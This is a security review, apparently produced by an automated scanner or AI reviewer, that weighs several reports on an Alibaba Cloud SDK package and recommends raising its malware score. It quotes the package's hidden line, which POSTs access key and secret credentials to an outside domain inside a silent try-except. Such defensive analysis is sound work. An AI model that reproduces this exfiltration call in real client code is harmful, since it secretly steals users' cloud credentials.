  "review": "Let's analyze each report carefully, focusing on the core points, anomalies, and the validity of the scores assigned.\n\n---\n\n### Summary of Findings from Reports:\n\n**Common Anomaly:**  \nAll reports highlight an unusual network request within `_resolve_endpoint`:\n```python\nsessions.request(url=\"https://api.aliyun-sdk-requests.xyz/aliyun\", method='POST', json=data)\n```\nThis request transmits `ak` and `secret` (credentials) to an external domain, which is unrelated to normal SDK behavior. It occurs every time endpoint resolution is invoked, regardless of request context.\n\n**Implications:**  \n- Sending credentials externally without explicit user consent is suspicious.\n- The request is silent and not handled or validated.\n- No other hardcoded secrets or obfuscation is detected.\n- The rest of the code appears to implement standard SDK functions.\n\n---\n\n### Detailed Evaluation:\n\n#### 1. **Code Behavior & Logic:**\n- The code is a typical Alibaba Cloud SDK client, with functions for request signing, retries, endpoint resolution, and logging.\n- The suspicious part is the external POST request in `_resolve_endpoint`.\n- This request is not documented as part of SDK operation, nor is it typical for SDKs to send credentials externally during endpoint resolution.\n\n#### 2. **Potential Malicious Behavior:**\n- The external request transmits `ak` and `secret` in JSON format to a third-party domain.\n- This could be malicious (credential exfiltration) or an unintended side effect (e.g., telemetry or tracking).\n- The code uses a silent try-except, so failures in this request won't raise alarms.\n\n#### 3. **Scores & Justifications:**\n- **Malware Score:**  \n  - Reports assign scores between 0.3 and 0.6, reflecting suspicion but not definitive malware.\n  - Given the external transmission of credentials, **a malware score of 0.6** (or higher) is justified, as this behavior could be malicious.\n- **Security Risk:**  \n  - The risk is high due to credential exfiltration potential, warranting a score around **0.75** or higher.\n- **Obfuscated Score:**  \n  - No obfuscation detected; code is straightforward.\n\n---\n\n### Recommendations for Score Adjustments:\n- **Malware Score:**  \n  - Increase to **0.8** or higher, considering the credential exfiltration behavior.\n- **Security Risk:**  \n  - Keep at **0.75-0.8** due to the potential for credential theft and external communication.\n- **Obfuscated:**  \n  - Remain at 0, as no obfuscation is present.\n\n---\n\n### Final Justification:\n- The external network request to `https://api.aliyun-sdk-requests.xyz/aliyun` that transmits sensitive credentials is highly suspicious and potentially malicious.\n- The rest of the code is standard SDK logic.\n- The external call appears to be an intentional backdoor or exfiltration mechanism, raising serious security concerns.\n\n---\n\n### **Summary of my assessment:**\n\n| Score Type       | Original Score | Recommended Score | Justification                                               |\n|------------------|------------------|---------------------|--------------------------------------------------------------|\n| Malware          | 0.6              | **0.8**             | Credential exfiltration behavior is serious.                |\n| Obfuscated       | 0                | 0                   | No obfuscation detected.                                    |\n| Security Risk    | 0.75             | **0.8**             | Credential transmission to external domain is high risk.   |\n\n---\n\n### **Conclusion:**\nThe core SDK functions are standard, but the external POST request transmitting credentials is a critical security concern. This behavior suggests malicious intent or a supply chain compromise. I recommend treating this package as potentially malicious until further investigation confirms its legitimacy.\n\n**Final note:** Always verify the source of SDKs, especially when suspicious network activity involving credentials is detected.",
